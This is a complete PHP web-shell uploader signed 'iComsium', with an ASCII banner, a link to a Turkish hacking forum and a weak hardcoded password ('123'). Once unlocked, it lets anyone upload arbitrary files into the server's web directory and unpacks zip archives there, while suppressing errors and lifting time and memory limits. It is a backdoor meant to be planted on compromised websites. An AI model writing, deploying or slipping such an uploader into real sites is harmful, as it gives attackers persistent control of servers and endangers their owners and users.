<?php

$password = "123"; // Password 

session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "<pre align=center><font>
	
 _  ____                    _                 
(_)/ ___|___  _ __ ___  ___(_)_   _ _ __ ___  
| | |   / _ \| '_ ` _ \/ __| | | | | '_ ` _ \ 
| | |__| (_) | | | | | \__ \ | |_| | | | | | |
|_|\____\___/|_| |_| |_|___/_|\__,_|_| |_| |_|
                                              
</font><font>https://spyhackerz.org/forum/members/icomsium.58799/</font><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form> <br><img src=https://hackerhaberleri.files.wordpress.com/2016/04/3l6ol0.png></img><br></pre>";
        exit;        
    }

}

echo '<font face="Comic Sans MS" </font><b>[♥] Dosya Yükle [♥]<br><br><font face="Comic Sans MS" <br>- iComsium -</b></font>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
$file = $_FILES['file']['name'];
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
$zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
echo 'Yükleme Ba?ar?l?';
} else {
echo '[ + ] Upload Sucess [ + ]';
}    
}else{ 
echo '<b>[ - ] No Upload [ - ]</b><br><br>'; 
}
}
?>